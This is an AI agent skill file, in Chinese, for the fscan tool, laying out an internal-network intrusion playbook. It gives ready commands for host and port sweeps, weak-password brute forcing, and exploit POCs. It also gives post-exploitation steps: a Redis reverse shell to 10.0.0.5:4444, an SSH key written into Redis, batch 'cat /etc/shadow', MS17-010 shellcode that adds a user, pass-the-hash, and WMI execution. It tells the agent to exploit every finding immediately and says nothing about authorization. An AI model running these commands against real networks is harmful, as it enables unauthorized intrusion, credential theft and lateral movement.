---
name: fscan-scan
description: "使用 fscan 进行内网综合扫描与利用。当拿到内网立足点后需要做存活探测、端口扫描、弱口令爆破、漏洞检测时，fscan 是第一选择——单二进制零依赖，一条命令完成存活+端口+服务+弱口令+POC全流程。也支持 Redis 写公钥/计划任务、SSH 命令执行、MS17-010 利用、Pass-the-Hash、WMI 远程执行等后利用操作。任何涉及内网扫描、网段探测、弱口令批量检测、内网漏洞扫描、域控识别、NetBIOS 探测的场景都应使用此技能。即使只是想快速看看一个网段有什么活跃主机，也优先用 fscan 而非 nmap"
metadata:
  tags: "fscan,内网扫描,端口扫描,弱口令,poc,存活探测,lateral,port,scan,bruteforce,网段,内网渗透,redis,ms17010,netbios,域控"
  category: "tool"
---

# fscan 内网综合扫描

fscan 把内网渗透中最常用的几个动作——存活探测、端口扫描、服务识别、弱口令爆破、漏洞 POC、甚至部分利用——集成到了一个无依赖的 Go 二进制中。在内网机器上传上去就能跑，不用装 nmap 也不用装 Python。

> **重要**：后渗透场景 fscan 应该尽量传到目标机器上执行，而不是在本地通过代理隧道跑——SOCKS5 不支持 ICMP，存活探测会失效；大量扫描流量走隧道又慢又不稳定。如何投递工具到目标 → 加载 `tool-delivery` 技能。

项目地址：https://github.com/shadow1ng/fscan

## 为什么内网扫描优先 fscan

| 维度 | fscan | nmap |
|------|-------|------|
| 部署 | 单二进制，scp 上去直接用 | 需安装，内网机器上通常没有 |
| 速度 | 默认 600 线程并发，/24 秒级完成 | 默认单线程，慢 |
| 弱口令 | 内置 SSH/SMB/RDP/MySQL/MSSQL/Redis/PostgreSQL/Oracle/FTP/MongoDB 爆破 | 不支持 |
| POC | 内置 MS17-010/Redis 未授权/WebLogic/Struts2 等，兼容 xray POC | 需要 NSE 脚本 |
| 利用 | Redis 写公钥、SSH 命令执行、MS17-010 ShellCode | 不支持 |
| 域控识别 | NetBIOS 探测 + DC 标识 | 需要额外脚本 |
| Web 指纹 | 自动识别 CMS/OA 框架（致远、泛微、通达等） | 不支持 |

nmap 的优势在精确服务版本识别（`-sV`）和 NSE 脚本生态。推荐流程：**fscan 快速全网段扫描 → nmap 对高价值目标深度探测**。

## Phase 1: 基础扫描

```bash
# 最常用：全功能扫描（存活+端口+弱口令+POC 一起跑）
fscan -h 10.0.0.0/24

# 快速模式（只做存活+端口，跳过 Web POC）
fscan -h 10.0.0.0/24 -nopoc

# 静默扫描（减少输出噪音）
fscan -h 10.0.0.0/24 -nopoc -nobr

# 从文件读取目标
fscan -hf targets.txt

# 排除特定主机
fscan -h 10.0.0.0/24 -hn 10.0.0.1,10.0.0.254
```

`-nopoc` 跳过 Web 漏洞 POC，`-nobr` 跳过弱口令爆破——两者独立控制。全都跳过就只剩存活+端口扫描，最快但信息最少。

## Phase 2: 端口与模块控制

```bash
# 指定端口
fscan -h 10.0.0.0/24 -p 22,80,445,3389,6379

# 在默认端口列表上追加端口（不覆盖默认的）
fscan -h 10.0.0.0/24 -pa 3389,5985

# 排除某些端口
fscan -h 10.0.0.0/24 -pn 445

# 全端口
fscan -h 10.0.0.0/24 -p 1-65535

# 只跑某个模块（不做全量扫描）
fscan -h 10.0.0.0/24 -m ssh          # 只做 SSH 爆破
fscan -h 10.0.0.0/24 -m ms17010      # 只做永恒之蓝检测
fscan -h 10.0.0.0/24 -m netbios      # 只做 NetBIOS 探测（域控识别）
fscan -h 10.0.0.0/24 -m icmp         # 只做存活探测（大网段用）
fscan -h 10.0.0.0/24 -m webonly      # 跳过端口扫描，直接探测 Web
```

默认端口列表：`21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017`

`-m` 的价值在于精确控制——全量扫描太慢时，指定模块只做你关心的事。

## Phase 3: 弱口令爆破

这是 fscan 对比 nmap 最大的差异化价值。默认扫描已包含弱口令检测（内置字典），但你也可以自定义：

```bash
# 自定义用户名和密码（逗号分隔）
fscan -h 10.0.0.0/24 -user admin,root,sa -pwd 'admin,123456,P@ssw0rd'

# 在默认字典基础上追加（不覆盖内置的）
fscan -h 10.0.0.0/24 -usera DBA -pwda 'Str0ngPwd!'

# 从文件加载
fscan -h 10.0.0.0/24 -userf /tmp/users.txt -pwdf /tmp/passwords.txt

# 爆破线程（默认 1，增大可加速但更容易被检测）
fscan -h 10.0.0.0/24 -br 5

# 域用户爆破（SMB）
fscan -h 10.0.0.0/24 -m smb -domain CORP
```

支持的爆破协议：

| 协议 | 默认端口 | 说明 |
|------|----------|------|
| SSH | 22 | Linux 远程访问 |
| SMB | 445 | Windows 文件共享、Pass-the-Hash |
| RDP | 3389 | Windows 远程桌面 |
| MySQL | 3306 | 数据库 |
| MSSQL | 1433 | 数据库（sa 弱口令高频） |
| PostgreSQL | 5432 | 数据库 |
| Oracle | 1521 | 数据库 |
| Redis | 6379 | 无认证=直接利用 |
| FTP | 21 | 文件传输 |
| MongoDB | 27017 | 无认证=数据泄露 |
| Memcached | 11211 | 无认证 |

## Phase 4: 漏洞 POC 与 Web 指纹

```bash
# 默认扫描自带 POC（MS17-010, Redis 未授权, WebLogic, Struts2 等）
fscan -h 10.0.0.0/24

# 只跑特定名称的 POC
fscan -h 10.0.0.0/24 -pocname weblogic
fscan -h 10.0.0.0/24 -pocname shiro

# 完整 POC 扫描（如 shiro 检测 100 个 key 而非默认 10 个）
fscan -h 10.0.0.0/24 -full

# 加载外部 xray 格式 POC
fscan -h 10.0.0.0/24 -pocpath /tmp/my_pocs/

# 通过 HTTP 代理转发 POC 流量（配合 Burp 审计）
fscan -h 10.0.0.0/24 -proxy http://127.0.0.1:8080
```

Web 指纹识别是自动的——fscan 会识别常见 CMS（WordPress/Drupal）和国产 OA 系统（致远/泛微/通达/用友），输出中会标注。

## Phase 5: 后利用功能

fscan 不只是扫描器，还能直接做一些利用操作。这在内网渗透中很有用——扫到弱点后立即利用，不用切换工具：

```bash
# Redis 写 SSH 公钥（无认证 Redis → SSH 登录）
fscan -h 10.0.0.30 -rf ~/.ssh/id_rsa.pub

# Redis 计划任务反弹 shell
fscan -h 10.0.0.30 -rs 10.0.0.5:4444

# SSH 批量执行命令（扫到弱口令后直接用）
fscan -h 10.0.0.0/24 -c "cat /etc/shadow"

# SSH 使用私钥连接
fscan -h 10.0.0.10 -m ssh -sshkey /tmp/id_rsa

# MS17-010 利用（内置 ShellCode，如添加用户）
fscan -h 10.0.0.10 -m ms17010 -sc add

# SMB Hash 碰撞（Pass-the-Hash）
fscan -h 10.0.0.0/24 -m smb2 -user administrator -hash aad3b435b51404eeaad3b435b51404ee:xxxxx

# WMI 无回显命令执行
fscan -h 10.0.0.10 -m wmiexec -user admin -pwd password -c "whoami"
```

## Phase 6: 网络与性能调优

```bash
# 不做 ICMP 存活探测（防火墙禁 ping 时用）
fscan -h 10.0.0.0/24 -np

# 用 ping 代替 ICMP 包（某些环境 raw socket 受限）
fscan -h 10.0.0.0/24 -ping

# 调整并发线程（默认 600，大网段可调高）
fscan -h 10.0.0.0/16 -t 2000

# 调整超时（默认 3 秒，网络差时调高）
fscan -h 10.0.0.0/24 -time 5

# Web 超时（默认 5 秒）
fscan -h 10.0.0.0/24 -wt 10

# SOCKS5 代理（多层网络，通过代理扫内层）
fscan -h 172.16.0.0/24 -socks5 127.0.0.1:1080

# 输出到文件（默认 result.txt）
fscan -h 10.0.0.0/24 -o /tmp/fscan_result.txt

# 不保存文件
fscan -h 10.0.0.0/24 -no

# 大网段快速摸底（扫 /8 时自动采样每个 C 段网关+随机 IP）
fscan -h 192.0.0.0/8 -m icmp
```

## 输出解读

fscan 自动分类输出，关注这些关键标记：

| 标记 | 含义 | 行动 |
|------|------|------|
| `[+] MS17-010` | 永恒之蓝 | 🔴 立即用 msf 利用或 fscan `-sc add` |
| `[+] DC` | 域控制器 | 🔴 最高价值目标，记录 IP |
| `[+] Redis unauthorized` | Redis 无认证 | 🔴 `fscan -rf` 写公钥或 `-rs` 反弹 shell |
| `[+] weak password` | 弱口令命中 | 🔴 立即登录 |
| `[+] unauthorized` | 任何无认证服务 | 🔴 立即利用 |
| `[+] poc` / `[+] vuln` | 漏洞命中 | 🟡 验证后利用 |
| `[*] WebTitle` | Web 标题+指纹 | 🟢 识别 CMS/OA 类型 |
| `[*] NetBios` | NetBIOS 信息 | 🟢 主机名、域名、OS 版本 |
| `open` | 端口开放 | 🟢 记录，后续分析 |

## 实战场景速查

### 拿到内网立足点，快速摸底
```bash
ip addr | grep inet          # 确认当前网段
fscan -h 10.0.1.0/24 -o /tmp/result.txt  # 一把梭
cat /tmp/result.txt          # 查看所有发现
```

### 针对性弱口令（用已收集到的凭据）
```bash
fscan -h 10.0.0.0/24 -p 22,3389,445 \
  -user admin,administrator,root -pwd 'P@ssw0rd,Admin@123'
```

### 域控识别
```bash
fscan -h 10.0.0.0/24 -m netbios    # [+]DC 标记就是域控
```

### 跨网段扫描
```bash
fscan -h 172.16.0.0/24 -socks5 127.0.0.1:1080
```
